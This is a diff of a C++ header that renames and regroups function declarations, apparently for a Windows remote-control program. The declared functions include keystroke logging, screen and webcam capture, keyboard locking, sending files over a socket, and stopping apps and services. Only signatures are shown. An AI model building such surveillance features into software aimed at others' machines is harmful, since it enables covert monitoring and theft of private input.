@@ -27,82 +27,80 @@ extern BOOL isConnected;
 extern atomic<bool> isRecording;
 extern thread webcamThread;
 
-// process list apps
-json listApps();
+const string DATA_FILE = "data.bin";
+
+// start app
+string startApp(string);
+
+// stop app
+string stopApp(string);
+
+// list app
+json listApp();
 void writeAppListToFile(const vector<vector<string>>& apps);
 vector<vector<string>> getRunningApps();
 
-// process send file
-bool sendFile(SOCKET&, string);
+// start service
+string startService(string);
 
-// process list services
-string listServices();
+// stop service
+string stopService(string);
+
+// list service
+string listService();
 string convertWideCharToString(LPCWSTR wideCharStr);
 string getServiceDescription(SC_HANDLE hService);
 string truncateString(const string& str, size_t maxLength);
 vector<pair<string, tuple<int, string, string>>> listAllServices();
-void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services);
+void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services);
 
-// process list processes
+// list process
 string listProcess();
 
-// process start app
-string startApp(string);
+// get file
+bool sendFile(SOCKET&, string);
 
-// process start service
-string startService(string);
-
-// process stop app
-string stopApp(string);
-
-// process stop service
-string stopService(string);
-
-// Hàm xử lý chức năng xóa file
-string deleteFile(string& filePath);
-
+// copy file
 string copyFile(const string&, const string&);
 
-// Các hàm xử lý chức năng chụp màn hình
+// delete file
+string deleteFile(string& filePath);
+
+// take screenshot
 HBITMAP captureScreen(int& screenWidth, int& screenHeight);
-
 bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height);
-
 bool saveBinaryToImage(const string& binaryData, const string& savePath);
-
 void takeScreenshot();
 
-// process keylogger
+// keylogger
 map<int, string> createKeyMap();
 vector<string> collectKeyNames(int);
 void writeKeyNamesToFile(vector<string>&);
-string keyLogger(int);
+string keylogger(int);
 
-// process key lock
+// lock keyboard
 LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
 bool lockKeyboard();
 string lockKey(bool& flag);
 void runKeyLockingLoop();
 
-// process key unlock
+// unlock keyboard
 bool unlockKeyboard();
 string unlockKey();
 
-// process shutdown
+// shutdown
 void shutdown();
 
-// process restart
+// restart
 void restart();
 
-// process directory tree
+// list directory tree
 bool isHiddenOrSystem(const filesystem::path&);
 void printDirectoryTree(const filesystem::path&, wofstream&, int, int, int);
 bool listDrivesAndPrintTree();
-string getDirectoryTree();
+string listDirectoryTree();
 
-// process start webcam
+// webcam
 bool createWebcamVideo(int);
-string startWebcam();
-
-// process stop webcam
-string stopWebcam();
+string turnOnWebcam();
+string turnOffWebcam();
